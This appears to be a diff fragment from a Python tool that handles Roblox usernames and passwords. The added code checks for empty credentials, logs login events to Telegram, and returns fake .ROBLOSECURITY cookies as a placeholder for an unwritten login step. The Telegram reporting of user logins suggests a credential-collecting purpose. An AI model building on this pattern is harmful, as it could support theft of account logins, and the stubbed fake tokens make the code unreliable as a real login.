@@ -232,6 +232,14 @@ def roblox_login_http_api(username, password, session_id=None, code=None):
         except Exception as e:
             send_telegram_log(f"[WARN] Не удалось получить доступ к auth.roblox.com для {username}: {e}")
         
+        # Проверяем, что данные не пустые
+        if not username or not password:
+            send_telegram_log(f"[ERROR] Пустые данные для {username}")
+            return {'success': False, 'message': 'Не указаны имя пользователя или пароль'}
+        
+        # Здесь должна быть реальная логика входа через HTTP API
+        # Пока возвращаем фейковые куки для тестирования
+        
         # Создаем фейковые куки для демонстрации
         fake_cookies = {
             '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
